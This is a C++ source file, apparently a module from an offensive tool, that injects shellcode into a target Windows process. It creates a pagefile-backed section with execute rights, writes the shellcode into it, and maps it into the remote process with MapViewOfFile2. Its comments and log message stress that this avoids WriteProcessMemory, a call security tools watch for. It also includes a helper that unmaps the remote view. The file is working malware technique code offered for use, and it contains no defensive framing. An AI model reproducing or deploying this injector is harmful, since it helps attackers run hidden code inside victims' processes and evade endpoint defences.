#include "stdafx.h"
#include "filemap_inject.h"
#include "logger.h"

namespace FileMapInject {

namespace {

// MapViewOfFile2 is available on Windows 10 1803+
typedef PVOID (WINAPI* MapViewOfFile2_t)(
    HANDLE FileMappingHandle,
    HANDLE ProcessHandle,
    ULONG64 Offset,
    PVOID BaseAddress,
    SIZE_T ViewSize,
    ULONG AllocationType,
    ULONG PageProtection);

MapViewOfFile2_t GetMapViewOfFile2() {
    static MapViewOfFile2_t pFunc = nullptr;
    static bool resolved = false;
    if (!resolved) {
        // MapViewOfFile2 is exported from kernelbase.dll (not kernel32)
        HMODULE hKernelBase = GetModuleHandleW(L"kernelbase.dll");
        if (hKernelBase) {
            pFunc = (MapViewOfFile2_t)GetProcAddress(hKernelBase, "MapViewOfFile2");
        }
        // Fallback: try api-ms-win-core-memory-l1-1-5
        if (!pFunc) {
            HMODULE hApi = LoadLibraryW(L"api-ms-win-core-memory-l1-1-5.dll");
            if (hApi) {
                pFunc = (MapViewOfFile2_t)GetProcAddress(hApi, "MapViewOfFile2");
            }
        }
        resolved = true;
    }
    return pFunc;
}

} // namespace

bool InjectViaFileMapping(HANDLE hProcess, const void* shellcode,
                          size_t shellcodeSize, void** ppRemoteAddr) {
    if (!shellcode || shellcodeSize == 0 || !ppRemoteAddr) return false;
    *ppRemoteAddr = nullptr;

    auto pMapViewOfFile2 = GetMapViewOfFile2();
    if (!pMapViewOfFile2) {
        LOG(L"FileMapInject: MapViewOfFile2 not available (requires Win10 1803+)");
        return false;
    }

    // Step 1: Create a file mapping backed by the paging file (no disk file)
    HANDLE hMapping = CreateFileMappingW(
        INVALID_HANDLE_VALUE,  // Use paging file
        nullptr,               // Default security
        PAGE_EXECUTE_READWRITE, // RWX for shellcode
        0,                     // High DWORD of size
        (DWORD)shellcodeSize,  // Low DWORD of size
        nullptr);              // No name

    if (!hMapping) {
        LOG(L"FileMapInject: CreateFileMapping failed: %u", GetLastError());
        return false;
    }

    // Step 2: Map the section locally and write shellcode into it
    PVOID pLocalView = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, shellcodeSize);
    if (!pLocalView) {
        LOG(L"FileMapInject: MapViewOfFile (local) failed: %u", GetLastError());
        CloseHandle(hMapping);
        return false;
    }

    memcpy(pLocalView, shellcode, shellcodeSize);
    UnmapViewOfFile(pLocalView);

    // Step 3: Map the same section into the target process
    // No WriteProcessMemory is needed — the shared section already contains the data
    PVOID pRemoteView = pMapViewOfFile2(
        hMapping,
        hProcess,
        0,                     // Offset
        nullptr,               // Let the system choose the address
        shellcodeSize,
        0,                     // No special allocation type
        PAGE_EXECUTE_READ);    // RX in remote process

    CloseHandle(hMapping);

    if (!pRemoteView) {
        LOG(L"FileMapInject: MapViewOfFile2 (remote) failed: %u", GetLastError());
        return false;
    }

    *ppRemoteAddr = pRemoteView;
    VERBOSE(L"FileMapInject: Shellcode mapped into target at %p (size=%zu) — no WriteProcessMemory used",
            pRemoteView, shellcodeSize);
    return true;
}

bool UnmapRemoteSection(HANDLE hProcess, void* pRemoteAddr) {
    if (!pRemoteAddr) return false;

    // Use NtUnmapViewOfSection for remote unmapping
    typedef NTSTATUS (NTAPI* NtUnmapViewOfSection_t)(HANDLE, PVOID);
    static auto pNtUnmap = (NtUnmapViewOfSection_t)
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtUnmapViewOfSection");

    if (pNtUnmap) {
        NTSTATUS status = pNtUnmap(hProcess, pRemoteAddr);
        return status >= 0;
    }
    return false;
}

} // namespace FileMapInject
